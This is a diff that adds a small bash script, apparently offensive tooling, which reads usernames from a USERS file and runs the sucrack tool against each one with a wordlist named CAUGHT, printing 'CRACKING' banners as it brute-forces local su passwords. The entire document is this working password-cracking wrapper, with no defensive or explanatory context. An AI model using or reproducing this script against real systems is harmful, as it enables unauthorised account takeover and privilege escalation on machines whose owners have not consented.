@@ -1,0 +1,9 @@
+#!/bin/bash
+echo ""
+
+for i in `cat USERS`;do 
+echo "[+]CRACKING $i"
+./sucrack -w 20 -u $i CAUGHT
+echo "->DONE!"
+done
+echo "[+]MY JOB IS DONE HERE"
